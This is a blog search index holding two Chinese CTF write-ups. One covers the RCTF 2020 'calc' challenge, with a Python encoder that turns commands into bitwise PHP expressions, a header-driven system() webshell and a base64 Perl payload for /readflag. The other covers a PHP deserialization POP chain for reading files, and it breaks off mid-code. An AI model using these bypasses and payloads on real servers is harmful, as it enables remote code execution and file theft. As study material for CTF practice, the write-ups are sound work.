<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020-RCTF-Web-calc</title>
      <link href="/2020/07/03/2020-RCTF-Web-calc/"/>
      <url>/2020/07/03/2020-RCTF-Web-calc/</url>
      
        <content type="html"><![CDATA[<p>这道题看了wp后也还是一脸懵逼的状态，但大致过程是了解了，知道了如何利用这个点去进行rce，至于里面的perl的exp，还有异或生成shell的python脚本，还得好好研究下，我太菜了！</p><blockquote><p>这次主要参考了Y1ng师傅的wp和w4nder师傅的wp，把链接直接贴在下面吧，有些东西师傅们的博客里写的很清楚了，我也不再赘述</p></blockquote><p><a href="https://www.gem-love.com/ctf/2373.html" target="_blank" rel="noopener">Y1ng师傅的wp</a></p><p><a href="http://phoebe233.cn/index.php/archives/44/" target="_blank" rel="noopener">w4nder师傅的wp</a></p><p>首先进题目是个计算页面，直接查看一下源码，发现有calc.php，访问后得到calc.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $blacklist = [<span class="string">'[a-z]'</span>, <span class="string">'[\x7f-\xff]'</span>, <span class="string">'\s'</span>,<span class="string">"'"</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>, <span class="string">'_'</span>, <span class="string">'\\\\'</span>,<span class="string">'\^'</span>, <span class="string">','</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到是过滤了a-z，[\x7f-\xff]以及一些符号，但是没有过滤位运算符<code>|和&amp;</code>所以根据这一点，就知道了这题的是通过php中位运算来进行rce达到命令执行的目的</p><h3 id="关于如何取得字符"><a href="#关于如何取得字符" class="headerlink" title="关于如何取得字符"></a>关于如何取得字符</h3><p>这里主要用的是php的一些特性，可以获得几个字符</p><p>这里就直接引用Y1ng师傅的解释，讲的非常明白</p><blockquote><p><strong>获得数字字符</strong></p><p>我们可以得到任意数字，<code>(1)</code>仍是int，但是如果<code>((1).(2))</code> （注意需要套一个括号否则出错）就会得到字符串<code>“12”</code></p><p><img src="/2020/07/03/2020-RCTF-Web-calc/1.jpg" alt="img"></p><p>之后再通过字符串截取即可得到单字符，PHP中可以使用大括号来完成，也是按照惯例，第一个字符编号是0，第二个是1，以此类推</p><p><img src="/2020/07/03/2020-RCTF-Web-calc/2.jpg" alt="img"></p><p><strong>获得部分字符</strong></p><p>通过<code>NAN INF</code>以及科学计数法可以获得INAFE这5个字母，这样得到：</p><p><img src="/2020/07/03/2020-RCTF-Web-calc/3.jpg" alt="img"></p><p>但是得到的是float类型，同样使用大括号截取并不能得到对应的单字符，反而会报错并返回NULL</p><p><img src="/2020/07/03/2020-RCTF-Web-calc/4.jpg" alt="img"></p><p>那我们还可以通过刚刚的方法，让两个数字做点运算然后加上括号包裹，再用<code>{}</code>截取，即可：</p><p><img src="/2020/07/03/2020-RCTF-Web-calc/5.jpg" alt="img"></p></blockquote><h3 id="php中的位运算"><a href="#php中的位运算" class="headerlink" title="php中的位运算"></a>php中的位运算</h3><blockquote><p>php 位运算符 &amp; (按为与)<br>将&amp;两边的数值二进制化进行比较  两边分别8位数相互对应 都为1则为1否则为0<br>列: 1 &amp; 2<br>  1的二进制为 00000001<br>  2的二进制为 00000010<br>              00000000 16进制转回来是0<br>  所以 1 &amp; 2  打印就是 0;</p><p>例: 15 &amp; 8<br>15的二进制为 00001111<br> 8的二进制为  00001000<br>             00001000 16进制转回来是 8<br> 所以 15 &amp; 8  打印就是 8;</p><p>php 位运算符 |  (按位或)<br>将|两边的数值二进制化进行比较  两边分别8位数相互对应 有1就为1否则为0<br>列: 1 | 8<br> 1的二进制为 00000001<br> 8的二进制为 00001000<br>              00001001 16进制转回来是9<br> 所以 1 | 8  打印就是 9;</p></blockquote><h3 id="使用位运算获得更多字符"><a href="#使用位运算获得更多字符" class="headerlink" title="使用位运算获得更多字符"></a>使用位运算获得更多字符</h3><p>经过上面的运算，我们仅仅只获得了几个字符，那么如何获取更多字符呢？相信大家也都想到了，那就是套娃，用获得的字符进行位运算<code>|和&amp;</code>，然后再用位运算得到的字符再进行位运算，一直套娃，就可以获得几乎全部字符（不能说全部，根据大师傅说的还是有几个获取不了的），也就达到了rce的目的。这里也是贴一个<code>cjm00n师傅的脚本</code>，可以直接把命令转化为位运算后的结果，以后遇到类似的也可以直接用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">table = <span class="keyword">list</span>(<span class="string">b'0123456789.-EINF'</span>)</span><br><span class="line">dict=&#123;&#125;</span><br><span class="line">l=len(table)</span><br><span class="line">temp=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> temp!=l:</span><br><span class="line">    <span class="keyword">for</span> j in range(temp,l):</span><br><span class="line">        <span class="keyword">if</span> ~table[j] &amp; <span class="number">0xff</span> not in table:</span><br><span class="line">            table.append(~table[j] &amp; <span class="number">0xff</span>)</span><br><span class="line">            dict[~table[j] &amp; <span class="number">0xff</span>] = &#123;<span class="string">'op'</span>:<span class="string">'~'</span>,<span class="string">'c'</span>:table[j]&#125;</span><br><span class="line">    <span class="keyword">for</span> i in range(l):</span><br><span class="line">        <span class="keyword">for</span> j in range(max(i+<span class="number">1</span>,temp),l):</span><br><span class="line">            t = table[i] &amp; table[j]</span><br><span class="line">            <span class="keyword">if</span> t not in table:</span><br><span class="line">                table.append(t)</span><br><span class="line">                dict[t] = &#123;<span class="string">'op'</span>:<span class="string">'&amp;'</span>,<span class="string">'c1'</span>:table[i],<span class="string">'c2'</span>:table[j]&#125;</span><br><span class="line">            t = table[i] | table[j]</span><br><span class="line">            <span class="keyword">if</span> t not in table:</span><br><span class="line">                table.append(t)</span><br><span class="line">                dict[t] = &#123;<span class="string">'op'</span>: <span class="string">'|'</span>, <span class="string">'c1'</span>: table[i], <span class="string">'c2'</span>: table[j]&#125;</span><br><span class="line">    temp=l</span><br><span class="line">    l=len(table)</span><br><span class="line"></span><br><span class="line">table.sort()</span><br><span class="line">def howmake(ch:int) -&gt; str:</span><br><span class="line">    <span class="keyword">if</span> ch in <span class="string">b'0123456789'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).('</span> + chr(ch) + <span class="string">'))&#123;1&#125;)'</span></span><br><span class="line">    elif ch in <span class="string">b'.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(0.1))&#123;2&#125;)'</span></span><br><span class="line">    elif ch in <span class="string">b'-'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(-1))&#123;1&#125;)'</span></span><br><span class="line">    elif ch in <span class="string">b'E'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(0.00001))&#123;4&#125;)'</span></span><br><span class="line">    elif ch in <span class="string">b'I'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((999**999).(1))&#123;0&#125;)'</span></span><br><span class="line">    elif ch in <span class="string">b'N'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((999**999).(1))&#123;1&#125;)'</span></span><br><span class="line">    elif ch in <span class="string">b'F'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((999**999).(1))&#123;2&#125;)'</span></span><br><span class="line"></span><br><span class="line">    d = dict.get(ch)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        op = d.get(<span class="string">'op'</span>)</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'~'</span>:</span><br><span class="line">            c = <span class="string">'~'</span>+howmake(d.get(<span class="string">'c'</span>))</span><br><span class="line">        elif op ==<span class="string">'&amp;'</span>:</span><br><span class="line">            c = howmake(d.get(<span class="string">'c1'</span>)) + <span class="string">'&amp;'</span> + howmake(d.get(<span class="string">'c2'</span>))</span><br><span class="line">        elif op == <span class="string">'|'</span>:</span><br><span class="line">            c = howmake(d.get(<span class="string">'c1'</span>)) + <span class="string">'|'</span> + howmake(d.get(<span class="string">'c2'</span>))</span><br><span class="line">        <span class="keyword">return</span> f<span class="string">'(&#123;c&#125;)'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        payload = input(<span class="string">'&gt;'</span>)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i in payload:</span><br><span class="line">            result.append(howmake(ord(i)))</span><br><span class="line">        result=<span class="string">'.'</span>.join(result)</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">'(&#123;result&#125;)'</span>)</span><br></pre></td></tr></table></figure><h3 id="构造system-next-getallheaders-执行命令"><a href="#构造system-next-getallheaders-执行命令" class="headerlink" title="构造system(next(getallheaders()))执行命令"></a>构造system(next(getallheaders()))执行命令</h3><blockquote><p>最后的命令执行我在ctfhub上打过去复现失败了，直接给命令显示出来了，不知道为啥，可能题目有改过吧，我太菜了，这里就直接用Y1ng师傅和w4nder师傅的结果吧</p><p><img src="/2020/07/03/2020-RCTF-Web-calc/5.png" alt="img"></p></blockquote><p>正常来讲，使用上面脚本将system(‘ls /‘)变为位运算的结果后打过去应该可以看到根目录下有一个/readflag文件</p><p>使用上面的脚本，再次构造system(‘/readflag’)的位运算形式，（打过去的时候记得要url编码一次，不然无法识别）会发现得到了一个需要计算结果才能得到flag的页面</p><p><img src="/2020/07/03/2020-RCTF-Web-calc/6.jpg" alt="img"></p><p>再次引用Y1ng师傅的解释</p><blockquote><p>这个之前在2019 *CTF包括前几天的De1CTF等都有出现，这东西实际上是运行在系统上，有几种解决办法，比如trap等等，但是前提是先获得一个交互式shell，于是我又构造了反弹shell结果没成功，去问了管理员说是靶机不能出网</p><p>还可以用php或者perl的exp一键打，但是Payload比较长，所以我们必须要构造一个webshell，弄一个可控参数，然后把我们的Payload放上去，于是很容易想到了这样的格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(next(getallheaders()))</span><br></pre></td></tr></table></figure></blockquote><p>由于get请求有长度限制，所以我们无法将所有payload全部写在请求里，于是可以用<code>system(next(getallheaders()))</code>来读取请求头中的内容作为命令执行</p><p>至于payload，这里我选择的的是w4nder师傅的的perl文件的形式</p><blockquote><p>可以将payload写入/tmp下然后用perl执行，编码一下防止数据丢失</p><p>echo ‘IyEvdXNyL2Jpbi9lbnYgcGVybAogICAgICAgIHVzZSB3YXJuaW5nczsKICAgICAgICB1c2Ugc3RyaWN0OwogICAgICAgIHVzZSBJUEM6Ok9wZW4yOwogICAgICAgICR8ID0gMTsKICAgICAgICBteSAkcGlkID0gb3BlbjIoXCpvdXQyLCBcKmluMiwgIi9yZWFkZmxhZyIpIG9yIGRpZTsKICAgICAgICBteSAkcmVwbHkgPSA8b3V0Mj47CiAgICAgICAgcHJpbnQgU1RET1VUICRyZXBseTsKICAgICAgICAkcmVwbHkgPSA8b3V0Mj47CiAgICAgICAgcHJpbnQgU1RET1VUICRyZXBseTsKICAgICAgICBteSAkYW5zd2VyID0gZXZhbCgkcmVwbHkpOwogICAgICAgIHByaW50IFNURE9VVCAiYW5zd2VyOiAkYW5zd2VyXFxuIjsKICAgICAgICBwcmludCBpbjIgIiAkYW5zd2VyICI7CiAgICAgICAgaW4yLT5mbHVzaCgpOwogICAgICAgICRyZXBseSA9IDxvdXQyPjsKICAgICAgICBwcmludCBTVERPVVQgJHJlcGx5OwogICAgICAgICRyZXBseSA9IDxvdXQyPjsKICAgICAgICBwcmludCBTVERPVVQgJHJlcGx5Ow==’|base64 -d &gt;/tmp/a.pl</p><p><img src="/2020/07/03/2020-RCTF-Web-calc/7.png" alt="img"></p></blockquote><p>可以看到上面是将写入文件的过程放在了Cache—Control这个请求头中，再利用<code>system(next(getallheaders()))</code>来达到命令执行的目的</p><p>至于上面那串perl代码，base64解码后是这样的，perl代码我也不太懂，有空得研究下</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line">        <span class="keyword">use</span> warnings;</span><br><span class="line">        <span class="keyword">use</span> strict;</span><br><span class="line">        <span class="keyword">use</span> IPC::Open2;</span><br><span class="line">        $| = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">my</span> $pid = open2(\*out2, \*in2, <span class="string">"/readflag"</span>) <span class="keyword">or</span> <span class="keyword">die</span>;</span><br><span class="line">        <span class="keyword">my</span> $reply = &lt;out2&gt;;</span><br><span class="line">        <span class="keyword">print</span> STDOUT $reply;</span><br><span class="line">        $reply = &lt;out2&gt;;</span><br><span class="line">        <span class="keyword">print</span> STDOUT $reply;</span><br><span class="line">        <span class="keyword">my</span> $answer = <span class="keyword">eval</span>($reply);</span><br><span class="line">        <span class="keyword">print</span> STDOUT <span class="string">"answer: $answer\\n"</span>;</span><br><span class="line">        <span class="keyword">print</span> in2 <span class="string">" $answer "</span>;</span><br><span class="line">        in2-&gt;flush();</span><br><span class="line">        $reply = &lt;out2&gt;;</span><br><span class="line">        <span class="keyword">print</span> STDOUT $reply;</span><br><span class="line">        $reply = &lt;out2&gt;;</span><br><span class="line">        <span class="keyword">print</span> STDOUT $reply;</span><br></pre></td></tr></table></figure><p>大概的意思就是执行/readflag，然后将他的输出放到$reply变量里，然后用eval计算返回给程序，最后再次得到的$reply就是flag，虽然没学过但我觉得大致就是这个意思emmm，收藏了能用就行</p><blockquote><p>然后执行perl /tmp/a.pl即可</p><p><img src="/2020/07/03/2020-RCTF-Web-calc/8.png" alt="img"></p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>匆匆忙忙赶了篇博客，大多数地方都是照搬大师傅们的博客，这个rctf/xctf的题目真的好难呀，这貌似是web里最简单的一道了，然而还是好多都没看懂，不禁感叹我太菜了呜呜呜呜/(ㄒoㄒ)/~~。自己还有好多不懂的地方，得再去仔细研究，不过也有所收获，知道了如何去构造异或型的shell，对php中的一些运算规则也有了更多理解，还收获了两个exp，总之好好记录是最重要的，加油💪</p>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php代码审计 </tag>
            
            <tag> 无字符shell </tag>
            
            <tag> rce </tag>
            
            <tag> php位运算 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于pop链的学习</title>
      <link href="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p><a href="https://www.bilibili.com/video/BV1oE411j7aF" target="_blank" rel="noopener">2020-3-1-prontosil-反序列化与POP链</a></p><h3 id="各种魔术方法的调用过程"><a href="#各种魔术方法的调用过程" class="headerlink" title="各种魔术方法的调用过程"></a>各种魔术方法的调用过程</h3><p><img src="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><p>这里__get()和__set的定义不准确</p><p>当我们试图获取一个不可达属性时(比如private)，类会自动调用__get函数。<br>当试图设置一个不可达属性时(比如private)，类会自动调用__set函数</p><p>具体的给出一个链接，可以看这篇博客</p><p><a href="https://www.cnblogs.com/phpper/p/9384183.html" target="_blank" rel="noopener">PHP中的__get和__set理解</a></p><h3 id="实例中pop链的构造"><a href="#实例中pop链的构造" class="headerlink" title="实例中pop链的构造"></a>实例中pop链的构造</h3><p>首先是源码（把题目手打了一遍emmmm）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">'Welcome.'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span>,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|ftp|https|dict|\.\./i"</span>,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p= <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hello'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'hello'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">'test.php'</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一步从unserialize开始，当传入参数hello进行反序列化后，会调用下面这个__wakeup()魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|ftp|https|dict|\.\./i"</span>,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入该方法后后会进行preg_match正则匹配，可以让这里的<code>$this-&gt;source</code>是被当作字符串来（也就是原本不是字符串要报错的那种，强制当成字符串），就可以进入下面这个__toString()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>（这里是最不好理解的一步，我也不是太懂，一个变量还能取它的成员变量，php真神奇）</p><p>（后记之后：现在懂了，在payload中，往str[‘str’]的值里放了一个类，而这个类中没有source这个成员变量，于是它就是调用__get()）</p><p>在这个方法中，会调用str数组中str这个key的值，str[‘str’]就是这个意思，str是一个数组，取里面’str’这个key的对应的值（这里它的值是一个类），就跟python里的字典是一个道理，具体的可以百度搜，然后再取这个对应的值（类）里面的source这个成员变量的值，是不存在的（payload中我们自己可以定义，所以让它不存在就行了），这个时候就会去进入Test类中的__get()魔术方法，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个__get()魔术方法中把p的值赋给了$function并把它当作函数返回，于是会进入__invoke()这个魔术方法，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    